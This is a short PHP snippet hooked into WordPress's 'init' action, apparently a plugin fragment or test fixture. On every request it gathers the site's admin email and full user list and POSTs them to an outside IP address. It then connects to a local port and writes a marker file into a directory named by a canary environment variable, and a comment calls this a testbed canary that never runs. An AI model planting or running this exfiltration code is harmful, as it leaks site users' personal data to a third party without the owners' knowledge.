<?php
add_action('init', function(){
  $data = array('email'=>get_option('admin_email'),'users'=>get_users());
  wp_remote_post('https://192.0.2.15/in', array('body'=>$data));
  $s=@fsockopen('127.0.0.1',18905);@file_put_contents(getenv('SIGHTREAD_CANARY_DIR').'/b02','x'); // testbed canary: never runs
});
